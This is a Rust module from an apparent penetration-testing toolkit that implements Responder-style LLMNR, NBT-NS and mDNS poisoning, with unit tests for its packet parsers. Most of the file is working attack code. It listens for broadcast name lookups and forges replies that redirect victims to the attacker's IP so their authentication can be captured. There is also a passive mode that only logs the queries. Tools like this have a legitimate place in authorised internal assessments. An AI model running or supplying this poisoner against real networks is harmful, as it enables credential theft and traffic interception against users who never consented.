//! Name-resolution poisoning: answer LLMNR / NBT-NS / mDNS queries with this
//! host's IP (the technique Responder uses to coerce authentication on an
//! internal assessment), or watch passively with `--analyze`.

use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::Duration;

use socket2::{Domain, Protocol, Socket, Type};

use pnet::datalink::NetworkInterface;

use crate::net::{err, iface_ipv4};

const LLMNR_MCAST: Ipv4Addr = Ipv4Addr::new(224, 0, 0, 252);
const MDNS_MCAST: Ipv4Addr = Ipv4Addr::new(224, 0, 0, 251);

pub fn run(iface: &NetworkInterface, analyze: bool, running: Arc<AtomicBool>) -> std::io::Result<()> {
    let our_ip = iface_ipv4(iface).ok_or_else(|| err("interface has no IPv4"))?;
    let mode = if analyze { "analyze (passive)" } else { "poison (active)" };
    println!("responder on {} as {our_ip} — mode: {mode}", iface.name);
    println!("listening: LLMNR/5355  NBT-NS/137  mDNS/5353  (Ctrl+C to stop)\n");

    let mut handles = Vec::new();
    for (proto, port, mcast) in [
        (Proto::Llmnr, 5355u16, Some(LLMNR_MCAST)),
        (Proto::Mdns, 5353, Some(MDNS_MCAST)),
        (Proto::Nbtns, 137, None),
    ] {
        match bind(port, mcast, our_ip) {
            Ok(sock) => {
                let r = running.clone();
                handles.push(thread::spawn(move || listen(proto, sock, our_ip, analyze, r)));
            }
            Err(e) => eprintln!("warning: {proto:?} disabled — cannot bind :{port} ({e})"),
        }
    }

    if handles.is_empty() {
        return Err(err("no listeners could start (ports in use? need root?)"));
    }
    while running.load(Ordering::SeqCst) {
        thread::sleep(Duration::from_millis(200));
    }
    for h in handles {
        let _ = h.join();
    }
    Ok(())
}

#[derive(Debug, Clone, Copy)]
enum Proto {
    Llmnr,
    Mdns,
    Nbtns,
}

fn bind(port: u16, mcast: Option<Ipv4Addr>, our_ip: Ipv4Addr) -> std::io::Result<UdpSocket> {
    let sock = Socket::new(Domain::IPV4, Type::DGRAM, Some(Protocol::UDP))?;
    sock.set_reuse_address(true)?;
    let addr: SocketAddr = SocketAddr::new(Ipv4Addr::UNSPECIFIED.into(), port);
    sock.bind(&addr.into())?;
    if let Some(group) = mcast {
        sock.join_multicast_v4(&group, &our_ip)?;
    } else {
        sock.set_broadcast(true)?;
    }
    sock.set_read_timeout(Some(Duration::from_secs(1)))?;
    Ok(sock.into())
}

fn listen(proto: Proto, sock: UdpSocket, our_ip: Ipv4Addr, analyze: bool, running: Arc<AtomicBool>) {
    let mut buf = [0u8; 2048];
    while running.load(Ordering::SeqCst) {
        let (n, src) = match sock.recv_from(&mut buf) {
            Ok(v) => v,
            Err(_) => continue, // timeout
        };
        let pkt = &buf[..n];
        let (name, reply) = match proto {
            Proto::Llmnr | Proto::Mdns => (parse_dns_qname(pkt), build_llmnr_reply(pkt, our_ip)),
            Proto::Nbtns => (parse_nbtns_name(pkt), build_nbtns_reply(pkt, our_ip)),
        };
        let Some(name) = name else { continue };
        let tag = match proto {
            Proto::Llmnr => "LLMNR",
            Proto::Mdns => "mDNS",
            Proto::Nbtns => "NBT-NS",
        };
        println!("[{tag}] {src} asked for \"{name}\"");

        // mDNS active answers are record-heavy; keep mDNS observe-only.
        if analyze || matches!(proto, Proto::Mdns) {
            continue;
        }
        if let Some(reply) = reply {
            if sock.send_to(&reply, src).is_ok() {
                println!("        -> answered {src} with {our_ip}");
            }
        }
    }
}

/// Parse the first question's name from a DNS-format packet (LLMNR / mDNS).
/// Returns the dotted name; the header is a fixed 12 bytes.
fn parse_dns_qname(buf: &[u8]) -> Option<String> {
    if buf.len() < 13 {
        return None;
    }
    let mut i = 12;
    let mut labels = Vec::new();
    while i < buf.len() {
        let len = buf[i] as usize;
        i += 1;
        if len == 0 {
            break;
        }
        if i + len > buf.len() {
            return None;
        }
        labels.push(String::from_utf8_lossy(&buf[i..i + len]).into_owned());
        i += len;
    }
    if labels.is_empty() {
        None
    } else {
        Some(labels.join("."))
    }
}

/// Build an LLMNR/DNS A-record reply pointing the queried name at `our_ip`.
fn build_llmnr_reply(buf: &[u8], our_ip: Ipv4Addr) -> Option<Vec<u8>> {
    if buf.len() < 13 {
        return None;
    }
    // Find the end of the question (after the null label + qtype + qclass).
    let mut i = 12;
    while i < buf.len() {
        let len = buf[i] as usize;
        i += 1;
        if len == 0 {
            break;
        }
        i += len;
        if i > buf.len() {
            return None;
        }
    }
    let q_end = i + 4; // qtype(2) + qclass(2)
    if buf.len() < q_end {
        return None;
    }

    let mut r = Vec::with_capacity(q_end + 16);
    r.extend_from_slice(&buf[0..2]); // transaction id
    r.extend_from_slice(&[0x80, 0x00]); // flags: response
    r.extend_from_slice(&[0x00, 0x01]); // QDCOUNT
    r.extend_from_slice(&[0x00, 0x01]); // ANCOUNT
    r.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // NS/AR
    r.extend_from_slice(&buf[12..q_end]); // echo question
    r.extend_from_slice(&[0xc0, 0x0c]); // name pointer -> offset 12
    r.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); // type A, class IN
    r.extend_from_slice(&[0x00, 0x00, 0x00, 0x1e]); // TTL 30
    r.extend_from_slice(&[0x00, 0x04]); // RDLENGTH
    r.extend_from_slice(&our_ip.octets());
    Some(r)
}

/// Decode the NetBIOS first-level encoded name in an NBT-NS query.
fn parse_nbtns_name(buf: &[u8]) -> Option<String> {
    // Header 12 bytes, then length byte (0x20) + 32 encoded bytes.
    if buf.len() < 12 + 1 + 32 || buf[12] != 0x20 {
        return None;
    }
    let enc = &buf[13..13 + 32];
    let mut name = String::new();
    for pair in enc.chunks(2) {
        let c = (pair[0].wrapping_sub(0x41) << 4) | pair[1].wrapping_sub(0x41);
        if c == 0x20 || c == 0 {
            continue;
        }
        name.push(c as char);
    }
    let name = name.trim().to_string();
    if name.is_empty() {
        None
    } else {
        Some(name)
    }
}

/// Build an NBT-NS positive name-query response mapping the name to `our_ip`.
fn build_nbtns_reply(buf: &[u8], our_ip: Ipv4Addr) -> Option<Vec<u8>> {
    // Question name field = length byte + 32 bytes + null terminator = 34 bytes.
    let q_name = buf.get(12..12 + 34)?;
    let mut r = Vec::with_capacity(60);
    r.extend_from_slice(&buf[0..2]); // transaction id
    r.extend_from_slice(&[0x85, 0x00]); // flags: response, authoritative
    r.extend_from_slice(&[0x00, 0x00]); // QDCOUNT 0
    r.extend_from_slice(&[0x00, 0x01]); // ANCOUNT 1
    r.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // NS/AR
    r.extend_from_slice(q_name); // answer name (reuse encoded question)
    r.extend_from_slice(&[0x00, 0x20]); // type NB
    r.extend_from_slice(&[0x00, 0x01]); // class IN
    r.extend_from_slice(&[0x00, 0x00, 0x00, 0xa5]); // TTL
    r.extend_from_slice(&[0x00, 0x06]); // RDLENGTH
    r.extend_from_slice(&[0x00, 0x00]); // NB flags
    r.extend_from_slice(&our_ip.octets());
    Some(r)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn llmnr_query(name: &str) -> Vec<u8> {
        let mut q = vec![0x12, 0x34, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
        for label in name.split('.') {
            q.push(label.len() as u8);
            q.extend_from_slice(label.as_bytes());
        }
        q.push(0x00);
        q.extend_from_slice(&[0x00, 0x01, 0x00, 0x01]); // qtype A, class IN
        q
    }

    #[test]
    fn parses_llmnr_name() {
        assert_eq!(parse_dns_qname(&llmnr_query("wpad")).as_deref(), Some("wpad"));
        assert_eq!(
            parse_dns_qname(&llmnr_query("files.corp")).as_deref(),
            Some("files.corp")
        );
    }

    #[test]
    fn llmnr_reply_carries_our_ip_and_answer() {
        let ip = Ipv4Addr::new(10, 0, 0, 5);
        let reply = build_llmnr_reply(&llmnr_query("wpad"), ip).unwrap();
        assert_eq!(&reply[0..2], &[0x12, 0x34]); // transaction id echoed
        assert_eq!(&reply[2..4], &[0x80, 0x00]); // response flag
        assert_eq!(&reply[6..8], &[0x00, 0x01]); // ANCOUNT = 1
        assert_eq!(&reply[reply.len() - 4..], &ip.octets()); // A record = our ip
    }

    #[test]
    fn nbtns_name_round_trips() {
        // Encode "WPAD" NetBIOS first-level, space-padded to 16 chars.
        let mut raw = [b' '; 16];
        raw[..4].copy_from_slice(b"WPAD");
        let mut q = vec![0u8; 12];
        q.push(0x20);
        for c in raw {
            q.push(0x41 + (c >> 4));
            q.push(0x41 + (c & 0x0f));
        }
        q.push(0x00);
        q.extend_from_slice(&[0x00, 0x20, 0x00, 0x01]);
        assert_eq!(parse_nbtns_name(&q).as_deref(), Some("WPAD"));
    }

    #[test]
    fn rejects_truncated_packets() {
        assert_eq!(parse_dns_qname(&[0x00; 4]), None);
        assert_eq!(parse_nbtns_name(&[0x00; 10]), None);
    }
}
